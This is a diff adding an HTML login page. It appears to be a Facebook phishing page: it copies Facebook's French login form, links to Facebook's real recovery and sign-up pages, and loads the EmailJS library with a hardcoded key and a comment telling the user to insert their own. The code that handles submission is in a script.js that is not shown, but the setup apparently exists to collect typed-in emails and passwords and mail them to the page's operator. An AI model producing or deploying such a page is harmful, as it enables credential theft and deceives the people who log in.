@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+</head>
+<body>
+    <div id="error" class="error"></div>
+    <div class="form-parent">
+        <form class="form-contact" action="#" id="form">
+            <div class="input-container">
+                <input class="login" type="text" id="name" placeholder=" ">
+                <label for="name">Adresse e-mail ou numéro de tél.</label>
+            </div>
+            <div class="input-container password-container">
+                <input class="login" type="password" id="password" placeholder=" ">
+                <label for="password">Mot de passe</label>
+                <i id="toggle-password" class="fas fa-eye-slash toggle-password"></i>
+            </div>
+            <input type="submit" value="Se connecter" class="login-btn" id="submit">
+            <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forget-link">
+                Mot de passe oublié ?
+            </a>
+            <input href="https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk" class="btn" value="Créer nouveau compte">
+            </input>
+        </form>
+    </div>
+    <script src="script.js"></script>
+    <script type="text/javascript">
+        (function(){
+           emailjs.init("Cf6AQnmKaonDjuzz5");  // استبدال publicKey بمعرف المستخدم الخاص بك
+        })();
+    </script>
+</body>
+</html>
